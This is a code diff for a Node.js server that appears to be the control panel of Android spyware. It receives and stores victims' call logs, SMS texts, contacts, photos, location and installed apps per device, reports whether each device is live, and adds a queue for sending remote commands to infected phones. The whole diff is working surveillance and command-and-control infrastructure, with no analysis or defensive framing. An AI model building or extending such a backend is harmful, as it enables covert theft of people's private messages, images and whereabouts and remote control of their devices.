@@ -8,7 +8,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
-app.use(bodyParser.json({ limit: '200mb' }));
+app.use(bodyParser.json({ limit: '500mb' }));
 app.use(express.static('public'));
 
 const dataDir = path.join(__dirname, 'data');
@@ -17,10 +17,12 @@ if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 const devicesFile = path.join(dataDir, 'devices.json');
 if (!fs.existsSync(devicesFile)) fs.writeFileSync(devicesFile, '[]');
 
+// ============ استقبال البيانات ============
 app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
         
+        // ✅ حفظ الصور
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -32,9 +34,10 @@ app.post('/upload.php', (req, res) => {
             if (!exists) imagesData.push({ name: data.file_name, path: data.file_path, data: data.file_data, size: data.file_size, date: data.timestamp });
             fs.writeFileSync(imagesFile, JSON.stringify(imagesData, null, 2));
             updateDevicesList(deviceId, null);
-            return res.json({ success: true });
+            return res.json({ success: true, images_count: imagesData.length });
         }
         
+        // ✅ البيانات العادية
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) { fs.mkdirSync(deviceDir, { recursive: true }); fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true }); }
@@ -44,43 +47,48 @@ app.post('/upload.php', (req, res) => {
         if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
         
         if (data.data) {
-            // ✅ دمج + إزالة تكرار + ترتيب للمكالمات
+            // ✅ مكالمات — دمج + تكرار + ترتيب
             if (data.data.call_logs && data.data.call_logs.length > 0) {
                 if (!existingData.call_logs) existingData.call_logs = [];
                 const merged = [...data.data.call_logs, ...existingData.call_logs];
                 const unique = [];
                 const seen = new Set();
-                for (const call of merged) {
-                    const key = `${call.number}_${call.date}_${call.type}`;
-                    if (!seen.has(key)) { seen.add(key); unique.push(call); }
+                for (const c of merged) {
+                    const key = `${c.number}_${c.date}_${c.type}`;
+                    if (!seen.has(key)) { seen.add(key); unique.push(c); }
                 }
                 unique.sort((a, b) => (b.date || 0) - (a.date || 0));
                 existingData.call_logs = unique;
             }
             
-            // ✅ دمج + إزالة تكرار + ترتيب للرسائل
+            // ✅ رسائل — دمج + تكرار + ترتيب
             if (data.data.sms && data.data.sms.length > 0) {
                 if (!existingData.sms) existingData.sms = [];
                 const merged = [...data.data.sms, ...existingData.sms];
                 const unique = [];
                 const seen = new Set();
-                for (const sms of merged) {
-                    const key = `${sms.address}_${sms.date}_${sms.body}`;
-                    if (!seen.has(key)) { seen.add(key); unique.push(sms); }
+                for (const s of merged) {
+                    const key = `${s.address}_${s.date}_${s.body}`;
+                    if (!seen.has(key)) { seen.add(key); unique.push(s); }
                 }
                 unique.sort((a, b) => (b.date || 0) - (a.date || 0));
                 existingData.sms = unique;
             }
             
+            // ✅ جهات اتصال
             if (data.data.contacts && data.data.contacts.length > 0) {
                 existingData.contacts = data.data.contacts;
             }
+            
+            // ✅ معلومات الجهاز
             if (data.data.device_info) {
                 existingData.device_info = data.data.device_info;
                 updateDevicesList(deviceId, data.data.device_info);
             } else {
                 updateDevicesList(deviceId, null);
             }
+            
+            // ✅ موقع وتطبيقات
             if (data.data.location) existingData.location = data.data.location;
             if (data.data.installed_apps) existingData.installed_apps = data.data.installed_apps;
         }
@@ -90,6 +98,7 @@ app.post('/upload.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ============ حالة حية ============
 app.post('/live_update.php', (req, res) => {
     try {
         const data = req.body;
@@ -109,18 +118,28 @@ app.post('/live_update.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ============ البيانات الحية ============
 app.get('/live.php', (req, res) => {
     try {
         const deviceId = req.query.device;
         if (!deviceId) return res.json({ error: 'Device ID required' });
         const liveFile = path.join(dataDir, deviceId, 'live.json');
         const dataFile = path.join(dataDir, deviceId, 'data.json');
-        let response = { online: false, network: 'غير متصل', battery: null, location: null };
+        const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
+        
+        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0 };
+        
         if (fs.existsSync(liveFile)) {
             const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
             const lastSeen = live.last_seen || 0;
-            response = { online: (Math.floor(Date.now()/1000) - lastSeen) < 30, network: live.network || 'غير معروف', battery: live.battery || null, location: live.location || null, last_seen: lastSeen };
+            response.online = (Math.floor(Date.now()/1000) - lastSeen) < 60;
+            response.network = live.network || 'غير معروف';
+            response.battery = live.battery || null;
+            response.location = live.location || null;
+            response.last_seen = lastSeen;
+            response.seconds_ago = Math.floor(Date.now()/1000) - lastSeen;
         }
+        
         if (fs.existsSync(dataFile)) {
             const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
             response.call_count = (allData.call_logs || []).length;
@@ -128,15 +147,22 @@ app.get('/live.php', (req, res) => {
             response.contacts_count = (allData.contacts || []).length;
             response.apps_count = (allData.installed_apps || []).length;
         }
+        
+        if (fs.existsSync(imagesFile)) {
+            response.images_count = JSON.parse(fs.readFileSync(imagesFile, 'utf8')).length;
+        }
+        
         res.json(response);
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ============ API ============
 app.get('/api.php', (req, res) => {
     try {
         const action = req.query.action;
         const deviceId = req.query.device;
         const type = req.query.type;
+        
         if (action === 'delete_device') {
             const deviceDir = path.join(dataDir, deviceId);
             if (fs.existsSync(deviceDir)) fs.rmSync(deviceDir, { recursive: true, force: true });
@@ -145,11 +171,13 @@ app.get('/api.php', (req, res) => {
             fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
             return res.json({ success: true });
         }
+        
         if (action === 'get_image_data') {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
             return res.json([]);
         }
+        
         if (action === 'get_data') {
             const dataFile = path.join(dataDir, deviceId, 'data.json');
             if (fs.existsSync(dataFile)) {
@@ -159,10 +187,38 @@ app.get('/api.php', (req, res) => {
             }
             return res.json([]);
         }
+        
+        if (action === 'get_commands') {
+            const commandsFile = path.join(dataDir, deviceId, 'commands.json');
+            if (fs.existsSync(commandsFile)) {
+                const commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
+                fs.writeFileSync(commandsFile, '[]');
+                return res.json({ commands });
+            }
+            return res.json({ commands: [] });
+        }
+        
         res.json({ error: 'Invalid action' });
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ============ أوامر ============
+app.post('/api.php', (req, res) => {
+    try {
+        const { device, command } = req.body;
+        if (!device || !command) return res.json({ error: 'Device and command required' });
+        const deviceDir = path.join(dataDir, device);
+        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+        const commandsFile = path.join(deviceDir, 'commands.json');
+        let commands = [];
+        if (fs.existsSync(commandsFile)) commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
+        commands.push({ command, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
+        fs.writeFileSync(commandsFile, JSON.stringify(commands));
+        res.json({ success: true });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+// ============ أجهزة ============
 app.get('/devices.json', (req, res) => {
     try { res.json(JSON.parse(fs.readFileSync(devicesFile, 'utf8'))); } catch (e) { res.json([]); }
 });
